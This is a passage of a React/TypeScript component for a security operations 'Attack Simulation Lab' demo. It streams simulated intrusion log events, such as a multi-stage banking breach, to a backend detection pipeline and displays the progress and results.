    setSelected(null); setPhase("idle"); setLogLines([]); setStatusMsg("");
    setLayerStates(PIPELINE_LAYERS.map(() => "waiting")); setEventCount(0);
  };

  const handleClearHistory = () => {
    clearSimulatedEvents();
    setHistoryCount(0);
  };

  const sleep = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));

// ── Full banking intrusion ──────────────────────────────────────────────────
  // The flagship scenario: 25 logs spanning a real intrusion (recon -> web
  // exploit -> webshell -> lateral movement -> C2 -> exfiltration), plus benign
  // business traffic and a scheduled vulnerability scan. Correlation should
  // reconstruct three separate campaigns from it and leave the benign traffic
  // alone. Same pipeline path as every other scenario.
  async function runFullScenario() {
    setSelected(null);
    setPhase("pipeline");
    setLogLines([]);
    setLayerStates(PIPELINE_LAYERS.map(() => "waiting"));
    setStatusMsg("Loading the multi-stage banking intrusion…");

    let advancing = true;
    const advance = (async () => {
      for (let idx = 0; idx < PIPELINE_LAYERS.length && advancing; idx++) {
        setLayerStates((prev) => prev.map((s, i) => (i === idx ? "running" : s)));
        setStatusMsg(`${PIPELINE_LAYERS[idx].icon} ${PIPELINE_LAYERS[idx].label}: ${PIPELINE_LAYERS[idx].sub}…`);
        await sleep(300);
        if (!advancing) break;
        setLayerStates((prev) => prev.map((s, i) => (i === idx ? "done" : s)));
      }
    })();

    try {
      const logsRes = await fetch("/demo_attack_scenario.json", { cache: "no-store" });
      if (!logsRes.ok) throw new Error("Could not load the scenario file");
      const logs = await logsRes.json();
      setEventCount(Array.isArray(logs) ? logs.length : 0);

      const form = new FormData();
      form.append(
        "file",
        new Blob([JSON.stringify(logs)], { type: "application/json" }),
        "banking-intrusion.json",
      );

      const res = await fetch("/api/run-pipeline", { method: "POST", body: form });
      const result = await res.json().catch(() => ({}));

      advancing = false;
      await advance;

      if (!res.ok) throw new Error(result?.message ?? `Pipeline returned ${res.status}`);

      setLayerStates(PIPELINE_LAYERS.map(() => "done"));
      clearSimulatedEvents();
      setHistoryCount(0);
      setPhase("done");

      const campaigns = Number(result?.campaigns ?? 0);
      setStatusMsg(
        `✅ ${result?.events ?? 0} alerts scored in ${result?.seconds ?? "?"}s — ` +
        `${campaigns} campaign${campaigns === 1 ? "" : "s"} correlated — opening campaigns…`,
      );
      await sleep(1600);
      window.location.href = "/campaigns";
    } catch (err) {
      advancing = false;
      await advance;
      setPhase("error");
      setStatusMsg(
        `⚠ ${err instanceof Error ? err.message : String(err)}. Start the backend with ` +
        `"uvicorn api_server:app --port 8000" and retry.`,
      );
    }
  }

  async function runSim(attack: AttackConfig) {
    setSelected(attack);
    setPhase("logs");
    setLogLines([]);
    setLayerStates(PIPELINE_LAYERS.map(() => "waiting"));
    setStatusMsg("Generating attack log stream…");

    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const events: Record<string, any>[] = attack.generateEvents();
    setEventCount(events.length);

    // 1. Stream log lines one by one — carry rich per-event context
    for (let i = 0; i < events.length; i++) {
      await sleep(250 + Math.random() * 200);
      const e = events[i];
      const re = e.raw_event ?? {};
      // Build a human-readable detail string from whatever rich fields exist
      let detail = "";
      if (re.url)        detail = re.url;
      else if (re.command) detail = re.command.length > 48 ? re.command.slice(0, 48) + "…" : re.command;
      else if (re.filename) detail = re.filename;
      else if (re.process)  detail = re.process;
      else if (re.protocol && re.port) detail = `${re.protocol.toUpperCase()}:${re.port}`;
      else if (re.bytes_out) detail = `${(re.bytes_out / 1024).toFixed(1)} KB out`;

      const statusStr =
        re.http_status ? `HTTP ${re.http_status}` :
        re.auth_result ?? re.result ?? "";

      setLogLines((prev) => [
        ...prev,
        {
          id: i,
          ts: new Date(re.timestamp ?? Date.now()).toLocaleTimeString(),
          type: re.log_type ?? "network",
          src: re.source_ip ?? "unknown",
          dst: re.destination_ip ?? re.affected_host ?? undefined,
          port: re.port ?? undefined,
          proto: re.protocol ?? undefined,
          action: re.action ?? "unknown",
          detail: detail || undefined,
          status: statusStr || undefined,
        },
      ]);
    }

    // 2. Send the RAW logs to the real backend pipeline.
    //    The scenario definitions carry a pre-built incident for offline
    //    fallback, but the live path deliberately submits only `raw_event` —
    //    Layers 1-6 in Python do the actual detection, CIS mapping, CVSS
    //    scoring and response planning, exactly as they would for an uploaded
    //    log file. Nothing about the verdict is decided in the browser.
    setPhase("pipeline");

    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const rawLogs = events.map((e: any) => e.raw_event).filter(Boolean);

    // Advance the layer indicator while the request is in flight, then settle
    // it on the real outcome. The backend processes the whole batch in one
    // call, so this reflects progress rather than per-layer timing.
    let advancing = true;
    const advance = (async () => {
      for (let idx = 0; idx < PIPELINE_LAYERS.length && advancing; idx++) {
        setLayerStates((prev) => prev.map((s, i) => (i === idx ? "running" : s)));
        setStatusMsg(`${PIPELINE_LAYERS[idx].icon} ${PIPELINE_LAYERS[idx].label}: ${PIPELINE_LAYERS[idx].sub}…`);
        await sleep(320);
        if (!advancing) break;
        setLayerStates((prev) => prev.map((s, i) => (i === idx ? "done" : s)));
      }
    })();

    try {
      const payload = new Blob([JSON.stringify(rawLogs, null, 2)], { type: "application/json" });
      const form = new FormData();
      form.append("file", payload, `${attack.id}-${rawLogs.length}-events.json`);

      const res = await fetch("/api/run-pipeline", { method: "POST", body: form });
      const result = await res.json().catch(() => ({}));

      advancing = false;
      await advance;

      if (!res.ok) {
        throw new Error(result?.message || result?.error || `Pipeline returned ${res.status}`);
      }

      setLayerStates(PIPELINE_LAYERS.map(() => "done"));

      // 3. Incidents are now persisted server-side in SQLite; the dashboard
      //    reads them from GET /api/incidents. Clear any stale browser-side
      //    simulation history so the two sources cannot disagree.
      setPhase("writing");
      setStatusMsg("Persisting incidents to the SOC database…");
      clearSimulatedEvents();
      setHistoryCount(0);

      const processed = Number(result?.events ?? rawLogs.length);
      setPhase("done");
      setStatusMsg(`✅ Pipeline complete — ${processed} incident${processed === 1 ? "" : "s"} scored and stored — opening dashboard…`);
      await sleep(1400);
      window.location.href = "/dashboard";
    } catch (err) {
      advancing = false;
      await advance;

      // Backend unreachable: fall back to the scenario's pre-built incidents so
      // the dashboard still has something to show, and say so plainly rather
      // than pretending the pipeline ran.
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      saveSimulatedEvents(events as any[]);
      const newTotal = readSimulatedEvents().length;
      setHistoryCount(newTotal);

      setPhase("error");
      setStatusMsg(
        `⚠ SOC backend unreachable (${err instanceof Error ? err.message : String(err)}). ` +
        `Loaded ${events.length} offline sample incidents instead — start the backend with ` +
        `"uvicorn api_server:app --port 8000" and re-run for live pipeline output.`
      );
    }
  }

  // ─── Severity & type badges ──────────────────────────────────────────────
  const sevBadge: Record<string, string> = {
    critical: "bg-red-500/20 text-red-300 border border-red-500/30",
    high:     "bg-orange-500/20 text-orange-300 border border-orange-500/30",
    medium:   "bg-amber-500/20 text-amber-300 border border-amber-500/30",
  };
  const logTypeBadge: Record<string, string> = {
    network:  "bg-cyan-500/20 text-cyan-300",
    web:      "bg-purple-500/20 text-purple-300",
    auth:     "bg-blue-500/20 text-blue-300",
    endpoint: "bg-orange-500/20 text-orange-300",
  };

  return (
    <div className="space-y-6">

      {/* Header */}
      <div className="rounded-xl border border-slate-700/80 bg-slate-900/60 p-6 shadow-lg">
        <div className="flex items-center justify-between flex-wrap gap-3">
          <div>
            <h1 className="text-2xl font-bold text-slate-100">🧪 Attack Simulation Lab</h1>
            <p className="mt-1 text-sm text-slate-400">
              Select an attack — logs stream in real-time through all 6 SOC pipeline layers, then populate the dashboard with full incident reports.
            </p>
            {historyCount > 0 && phase === "idle" && (
              <p className="mt-1.5 text-xs text-slate-500">
                📋 <span className="text-cyan-400 font-medium">{historyCount}</span> incidents accumulated in dashboard history
              </p>
            )}
          </div>
          <div className="flex items-center gap-2">
            {historyCount > 0 && phase === "idle" && (
              <button
                onClick={handleClearHistory}
                className="rounded-lg border border-red-800/60 px-3 py-1.5 text-xs font-medium text-red-400 hover:bg-red-900/30 transition"
              >
                🗑 Clear History
              </button>
            )}
            {phase !== "idle" && (
              <button onClick={reset} className="rounded-lg border border-slate-600 px-4 py-2 text-sm font-medium text-slate-300 hover:bg-slate-700 transition">
                ← New Simulation
              </button>
            )}
          </div>
        </div>
      </div>

      {/* Flagship scenario — the one to demo */}
      {phase === "idle" && (
        <button
          onClick={runFullScenario}
          className="group relative w-full overflow-hidden rounded-xl border border-red-900/50 bg-gradient-to-br from-red-950/30 via-slate-900 to-slate-900 p-6 text-left transition hover:border-red-800/70"
        >
          <div className="pointer-events-none absolute -right-16 -top-16 h-48 w-48 rounded-full bg-red-500/5 blur-3xl" />
          <div className="relative flex flex-wrap items-center justify-between gap-4">
            <div className="min-w-0 space-y-1.5">
              <p className="eyebrow text-red-400">Full scenario · 25 logs</p>
              <h2 className="text-lg font-bold text-slate-100">
                Multi-stage banking intrusion
              </h2>
              <p className="max-w-2xl text-xs leading-relaxed text-slate-400">
                Reconnaissance against the DMZ, a SQL injection, a webshell, lateral
                movement into the core banking database, C2 beaconing and a 486&nbsp;MB
                exfiltration — mixed with normal customer traffic and a scheduled
                vulnerability scan. Watch correlation separate one real breach from two
                harmless clusters.
              </p>
            </div>
            <span className="shrink-0 rounded-lg bg-red-500 px-5 py-2.5 text-xs font-bold text-slate-950 transition group-hover:bg-red-400">
              Run the intrusion →
            </span>
          </div>
        </button>
      )}

      {phase === "idle" && (
        <p className="eyebrow px-1">Or replay a single technique</p>
      )}

      {/* Attack Grid */}
      {phase === "idle" && (
        <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
          {ATTACKS.map((atk) => (
            <button key={atk.id} onClick={() => runSim(atk)}
              className="group relative overflow-hidden rounded-xl border border-slate-700/60 bg-slate-900/80 p-5 text-left transition-all duration-300 hover:border-slate-500/80 hover:-translate-y-0.5 hover:shadow-xl focus:outline-none">
              <div className="pointer-events-none absolute inset-0 rounded-xl opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                style={{ background: `radial-gradient(ellipse at 50% -20%, ${atk.color}22, transparent 65%)` }} />
              <div className="mb-3 flex items-start justify-between">
                <span className="text-3xl">{atk.icon}</span>
                <span className={`rounded-full px-2 py-0.5 text-[10px] font-bold uppercase tracking-widest ${sevBadge[atk.severity]}`}>{atk.severity}</span>
              </div>
              <h3 className="text-sm font-semibold text-slate-100 group-hover:text-white transition-colors">{atk.label}</h3>
              <p className="mt-1.5 text-xs text-slate-500 leading-relaxed">{atk.description}</p>
              <div className="mt-4 flex items-center gap-1.5 text-xs font-medium text-slate-600 group-hover:text-cyan-400 transition-colors">
                <span className="h-1.5 w-1.5 rounded-full bg-current" />
                Launch simulation →
              </div>
            </button>
          ))}
        </div>
      )}

      {/* Live View */}
      {phase !== "idle" && selected && (
        <div className="grid grid-cols-1 gap-5 lg:grid-cols-5">

          {/* Log Stream */}
          <div className="lg:col-span-3 rounded-xl border border-slate-700/70 bg-slate-950/80 overflow-hidden flex flex-col">
            <div className="px-4 py-3 border-b border-slate-800 flex items-center justify-between">
              <div className="flex items-center gap-2.5">
                <span className="text-lg">{selected.icon}</span>
                <div>
                  <span className="text-sm font-semibold text-slate-100">{selected.label}</span>
                  <span className="ml-2 text-xs text-slate-500">· raw log stream</span>
                </div>
              </div>
              <span className="text-xs text-slate-500 font-mono">{logLines.length}/{eventCount} events</span>
            </div>

            <div className="flex-1 h-72 overflow-y-auto p-4 space-y-1 font-mono text-xs">
              {logLines.map((l) => (
                <div key={l.id} className="flex flex-col gap-0.5 animate-fadeIn border-b border-slate-800/40 pb-1" style={{ animationFillMode: "forwards" }}>
                  <div className="flex items-center gap-2">
                    <span className="text-slate-600 shrink-0 tabular-nums text-[10px]">{l.ts}</span>
                    <span className={`shrink-0 rounded px-1.5 py-0.5 text-[9px] font-bold uppercase ${logTypeBadge[l.type] ?? "bg-slate-700 text-slate-300"}`}>{l.type}</span>
                    <span className="text-emerald-400 shrink-0 w-28 truncate">{l.src}</span>
                    {l.dst && <span className="text-slate-500 shrink-0">→</span>}
                    {l.dst && <span className="text-sky-400 shrink-0 w-24 truncate">{l.dst}</span>}
                    {l.port && <span className="text-slate-500 text-[9px]">:{l.port}</span>}
                    {l.proto && <span className="text-purple-400 text-[9px] uppercase">{l.proto}</span>}
                    <span className="text-red-300 font-semibold truncate flex-1">{l.action.replace(/_/g, " ")}</span>
                    {l.status && (
                      <span className={`shrink-0 text-[9px] font-bold px-1 rounded ${
                        l.status.includes("200") ? "text-emerald-400" :
                        l.status.includes("HTTP") ? "text-amber-400" :
                        l.status.includes("fail") || l.status.includes("deny") ? "text-red-400" :
                        "text-slate-400"
                      }`}>{l.status}</span>
                    )}
                  </div>
                  {l.detail && (
                    <div className="ml-[6.5rem] text-[9px] text-amber-300/80 truncate max-w-full">
                      ↳ {l.detail}
                    </div>
                  )}
                </div>
              ))}
              {phase === "logs" && (
                <div className="flex items-center gap-2 text-slate-500 pt-1">
                  <span className="inline-block h-2 w-2 rounded-full bg-cyan-400 animate-ping" />
                  <span className="animate-pulse text-[11px]">Capturing attack telemetry…</span>
                </div>
              )}
              {phase !== "logs" && logLines.length > 0 && (
                <div className="flex items-center gap-2 text-emerald-500 pt-1">
                  <span className="text-[11px]">✓ {logLines.length} events captured</span>
                </div>
              )}
              <div ref={logEndRef} />
            </div>
          </div>

          {/* Pipeline */}
          <div className="lg:col-span-2 rounded-xl border border-slate-700/70 bg-slate-900/80 overflow-hidden flex flex-col">
            <div className="px-4 py-3 border-b border-slate-800">
              <span className="text-sm font-semibold text-slate-100">SOC Pipeline</span>
              <p className="text-xs text-slate-500 mt-0.5">6-layer processing workflow</p>
            </div>

            <div className="flex-1 p-4 space-y-2 overflow-y-auto">
              {PIPELINE_LAYERS.map((layer, idx) => {
                const state = layerStates[idx];
                const isActive = state === "running";
                const isDone   = state === "done";
                return (
                  <div key={layer.id}
                    className={`relative rounded-lg border px-3.5 py-2.5 transition-all duration-500 ${
                      isDone   ? "border-emerald-500/30 bg-emerald-950/30" :
                      isActive ? "border-cyan-500/40 bg-cyan-950/20 shadow-lg shadow-cyan-500/10" :
                                 "border-slate-700/40 bg-slate-900/40"
                    }`}>
                    {isActive && (
                      <div className="absolute inset-x-0 bottom-0 h-0.5 rounded-b-lg overflow-hidden">
                        <div className="h-full w-1/2 rounded-full animate-slide" style={{ background: layer.color }} />
                      </div>
                    )}
                    <div className="flex items-center gap-2.5">
                      <span className="text-base shrink-0">{isDone ? "✅" : isActive ? "⏳" : "⬜"}</span>
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center gap-1.5">
                          <span className={`text-[11px] font-bold uppercase tracking-wider ${isDone ? "text-emerald-400" : isActive ? "text-cyan-300" : "text-slate-600"}`}>{layer.label}</span>
                          <span className={`text-xs font-medium ${isDone ? "text-emerald-300" : isActive ? "text-slate-200" : "text-slate-500"}`}>{layer.sub}</span>
                        </div>
                        {(isActive || isDone) && (
                          <p className="text-[10px] text-slate-500 mt-0.5 leading-tight truncate">{layer.desc}</p>
                        )}
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>

            <div className={`px-4 py-3 border-t border-slate-800 text-xs transition-all ${
              phase === "done"  ? "text-emerald-400" :
              phase === "error" ? "text-red-400" :
              "text-cyan-300 animate-pulse"
            }`}>
              {statusMsg || "Waiting…"}
            </div>
          </div>
        </div>
      )}

      {phase === "error" && (
        <div className="rounded-lg border border-red-500/30 bg-red-500/10 px-4 py-3 text-sm text-red-300">
          ⚠️ {statusMsg}
        </div>
      )}

      <style>{`
        @keyframes fadeIn { from { opacity:0; transform:translateX(-8px); } to { opacity:1; transform:translateX(0); } }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out forwards; }
        @keyframes slide { 0% { transform:translateX(-100%); } 100% { transform:translateX(300%); } }
        .animate-slide { animation: slide 1.2s linear infinite; }
      `}</style>
    </div>
  );
}